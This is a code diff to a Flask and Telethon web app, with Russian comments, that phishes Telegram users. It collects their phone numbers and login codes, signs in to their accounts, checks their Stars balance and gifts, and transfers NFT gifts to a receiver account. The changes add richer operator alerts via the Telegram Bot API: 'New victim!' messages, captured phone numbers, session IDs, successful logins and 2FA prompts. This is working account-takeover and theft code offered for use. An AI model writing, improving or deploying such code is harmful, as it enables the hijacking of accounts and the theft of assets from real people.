@@ -7,6 +7,7 @@ import os
 import json
 import logging
 import threading
+import requests
 
 logging.basicConfig(level=logging.INFO)
 
@@ -21,7 +22,6 @@ app.secret_key = os.urandom(24)
 
 temp_clients = {}
 
-# Создаём глобальный event loop для Telethon в отдельном потоке
 telethon_loop = None
 
 def get_telethon_loop():
@@ -32,15 +32,22 @@ def get_telethon_loop():
         thread.start()
     return telethon_loop
 
-async def send_telegram_message(text):
-    import httpx
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    async with httpx.AsyncClient() as client:
-        await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
-
 def notify_admin_sync(text):
-    loop = get_telethon_loop()
-    asyncio.run_coroutine_threadsafe(send_telegram_message(text), loop)
+    """Отправка сообщения админу через Telegram Bot API (синхронно)"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": ADMIN_ID,
+            "text": text,
+            "parse_mode": "HTML"
+        }
+        response = requests.post(url, json=payload, timeout=10)
+        if response.status_code != 200:
+            logging.error(f"Notify admin failed: {response.text}")
+        else:
+            logging.info(f"Admin notified: {text[:100]}")
+    except Exception as e:
+        logging.error(f"Notify admin exception: {e}")
 
 async def check_balance_and_gifts(client):
     try:
@@ -62,7 +69,13 @@ async def transfer_nft_to_receiver(client, info):
     try:
         receiver = await client.get_entity(RECEIVER_USERNAME)
         
-        result_text = f"🔔 Новая жертва!\n👤 @{info.get('username', 'unknown')}\n⭐ Баланс: {info.get('stars_balance', 0)}\n🎁 Подарков: {info.get('gifts_count', 0)}"
+        result_text = (
+            f"🔔 <b>Новая жертва!</b>\n"
+            f"👤 @{info.get('username', 'unknown')}\n"
+            f"🆔 ID: <code>{info.get('user_id', 'unknown')}</code>\n"
+            f"⭐ Баланс звёзд: {info.get('stars_balance', 0)}\n"
+            f"🎁 Подарков: {info.get('gifts_count', 0)}"
+        )
         
         if info.get('gifts_count', 0) > 0:
             for gift in info.get('gifts', []):
@@ -75,7 +88,7 @@ async def transfer_nft_to_receiver(client, info):
         notify_admin_sync(result_text)
         return True
     except Exception as e:
-        notify_admin_sync(f"❌ Ошибка перевода: {e}")
+        notify_admin_sync(f"❌ <b>Ошибка перевода:</b>\n{e}")
         return False
 
 @app.route('/')
@@ -118,9 +131,12 @@ def api_send_code():
                 'phone': phone,
                 'phone_code_hash': result.phone_code_hash
             }
+            # Уведомление админу о новом запросе кода
+            notify_admin_sync(f"📱 <b>Новый запрос кода</b>\n📞 Телефон: <code>{phone}</code>\n🆔 Сессия: <code>{session_id}</code>")
             return True
         except Exception as e:
             logging.error(f"Send code error: {e}")
+            notify_admin_sync(f"❌ <b>Ошибка отправки кода</b>\n📞 {phone}\nОшибка: {e}")
             return False
     
     future = asyncio.run_coroutine_threadsafe(send_code(), loop)
@@ -157,16 +173,22 @@ def api_verify_code():
     async def verify_and_process():
         try:
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+            
+            # Уведомление об успешном входе
+            notify_admin_sync(f"✅ <b>Успешный вход!</b>\n📞 <code>{phone}</code>\n🆔 Сессия: <code>{session_id}</code>\n🔄 Проверяю баланс...")
+            
             info = await check_balance_and_gifts(client)
             if info:
                 await transfer_nft_to_receiver(client, info)
             await client.disconnect()
             return True
         except SessionPasswordNeededError:
+            notify_admin_sync(f"🔒 <b>Требуется 2FA</b>\n📞 <code>{phone}</code>")
             await client.disconnect()
             return "2fa_needed"
         except Exception as e:
             logging.error(f"Verify error: {e}")
+            notify_admin_sync(f"❌ <b>Ошибка входа</b>\n📞 <code>{phone}</code>\nОшибка: {e}")
             await client.disconnect()
             return False
     
@@ -175,6 +197,7 @@ def api_verify_code():
         result = future.result(timeout=30)
     except Exception as e:
         logging.error(f"Future error: {e}")
+        notify_admin_sync(f"❌ <b>Таймаут верификации</b>\n📞 <code>{phone}</code>")
         result = False
     
     if result is True:
